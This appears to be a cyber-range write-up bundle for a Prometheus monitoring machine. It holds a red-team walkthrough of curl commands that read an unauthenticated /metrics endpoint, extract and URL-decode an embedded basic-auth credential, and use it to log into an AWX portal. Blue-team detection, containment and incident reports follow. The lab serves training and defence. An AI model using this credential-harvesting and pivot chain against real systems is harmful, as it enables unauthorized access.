# solve_red.md — M4 · itops-monitor
## Red Team Solution Writeup
**Range:** RNG-IT-02 | **Machine:** M4 — Prometheus Monitoring Portal
**Vulnerability:** Unauthenticated `/metrics` Endpoint — Credentials in Scrape Target URL Labels
**MITRE ATT&CK:** T1046 · T1552
**Severity:** High

---

## Objective
Access the unauthenticated `/metrics` endpoint on `203.x.x.x:9090`, parse the Prometheus-format output, identify the `pul_scrape_target_url` metric containing basic-auth credentials embedded in the scrape URL labels, URL-decode them, and use `devops-admin:DevOps@PUL!24` to login to the Ansible AWX portal (M5).

---

## Step-by-Step

### Step 1 — Discover Unauthenticated /metrics
```bash
curl -s http://203.x.x.x:9090/metrics | head -5
# Returns Prometheus-format text with no authentication prompt
```

<img width="1652" height="1187" alt="image" src="https://github.com/user-attachments/assets/3f95b9d4-6e1f-403a-8ed8-a39fc01a13d4" />


### Step 2 — Extract Credential Labels
```bash
curl -s http://203.x.x.x:9090/metrics | grep "pul_scrape_target_url"
```

<img width="1652" height="1187" alt="image" src="https://github.com/user-attachments/assets/9334174f-95b4-4f7d-8981-65fc550b80dd" />

**Output:**
```
pul_scrape_target_url{job="ansible-metrics",url="http://devops-admin:DevOps%40PUL%2124@203.x.x.x:8080/metrics",...} 1
```

### Step 3 — URL-Decode the Credential
```bash
python3 -c "import urllib.parse; print(urllib.parse.unquote('devops-admin:DevOps%40PUL%2124'))"
# Output: devops-admin:DevOps@PUL!24
```

<img width="1339" height="164" alt="image" src="https://github.com/user-attachments/assets/34af965a-08b5-4f46-bf0b-ded481f17c92" />


### Step 4 — Login to AWX Portal
```bash
curl -s -c /tmp/awx_cookies.txt -X POST http://203.x.x.x:8080/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=devops-admin&password=DevOps%40PUL%2124" -L
```
<img width="2008" height="914" alt="image" src="https://github.com/user-attachments/assets/5cea20fe-5d49-42e9-bad2-f9297b96e03d" />


**Pivot Credential:** `devops-admin : DevOps@PUL!24` → M5 `203.x.x.x:8080`

---

## MITRE ATT&CK
| Tactic | Technique | ID |
|---|---|---|
| Discovery | Network Service Discovery | T1046 |
| Credential Access | Unsecured Credentials | T1552 |
| Collection | Data from Information Repositories | T1213 |

---

# solve_blue.md — M4 · itops-monitor

## Detection
```bash
# Monitor access log for unauthenticated /metrics hits from non-monitoring IPs
grep "METRICS_ACCESS" /var/log/pul-monitor/monitor.log
# Look for IPs that are not the configured Prometheus scraper
```

**Indicator:**
```
METRICS_ACCESS | from=203.0.2.X | ua=curl/7.81.0
```
Any access to `/metrics` from a non-Prometheus scraper IP is suspicious.

## Containment
```bash
# 1. Add authentication to /metrics endpoint
# Edit app.py — add login_required decorator to metrics route

# 2. Remove credentials from scrape target URL labels
# Edit the METRICS_OUTPUT in app.py — never embed credentials in metric labels

# 3. Block attacker IP
ufw deny from <ATTACKER_IP> to any port 9090 comment "M4 metrics scrape"
```

## Eradication
- Never embed authentication credentials in Prometheus scrape target URLs.
- Use Prometheus `basic_auth` configuration file (with `password_file`) instead.
- `/metrics` endpoint must require authentication — even internally.
- Use Prometheus TLS client certificate authentication for production scraping.
- Rotate `devops-admin` credential immediately — notify M5 team.

## IOCs
| Type | Value |
|---|---|
| Attacker IP | `203.0.2.X` |
| Endpoint Accessed | `/metrics` (unauthenticated) |
| Credential Exposed | `devops-admin:DevOps@PUL!24` (URL-encoded in metric label) |
| Pivot Target | `203.x.x.x:8080` |

---

# INREP-IT02-M04.md
**Report ID:** INREP-IT02-M04 | **Reference:** GRIDFALL-RNG-IT02-M04

## Current Situation
Monitoring portal (`203.x.x.x:9090`) exposes a Prometheus-compatible `/metrics` endpoint without authentication. The `pul_scrape_target_url` metric contains basic-auth credentials for the Ansible AWX portal embedded in a URL label — `devops-admin:DevOps@PUL!24` URL-encoded in the label value. Adversary accessed the endpoint without credentials and decoded the URL to obtain the AWX login. Pivot to M5 in progress.

**Threat Level:** `HIGH`

## IOCs
| Type | Value |
|---|---|
| Endpoint | `/metrics` on `203.x.x.x:9090` — unauthenticated |
| Exposed Credential | `devops-admin:DevOps@PUL!24` |
| Pivot Target | `203.x.x.x:8080` (Ansible AWX) |

## Prevention
- Add authentication to `/metrics`. Use Prometheus `basic_auth` with `password_file`. Never embed passwords in label values.

## POC
> **[Attach: curl /metrics output showing pul_scrape_target_url with embedded credential]**
> **[Attach: URL-decoded credential and AWX login confirmation]**

**Prepared By:** Blue Team — [Team Name] | **Reference:** GRIDFALL-RNG-IT02-M04

---

# SITREP-IT02-M04.md | RED-REPORT-IT02-M04.md
See INREP for full detail. Attack chain: `unauthenticated /metrics` → URL-decode label → `devops-admin:DevOps@PUL!24` → M5 AWX login.

**TTPs:** T1046 (Network Service Discovery) · T1552 (Unsecured Credentials) · T1213 (Data from Repositories)
**Prepared By:** [Team] | **Reference:** GRIDFALL-RNG-IT02-M04
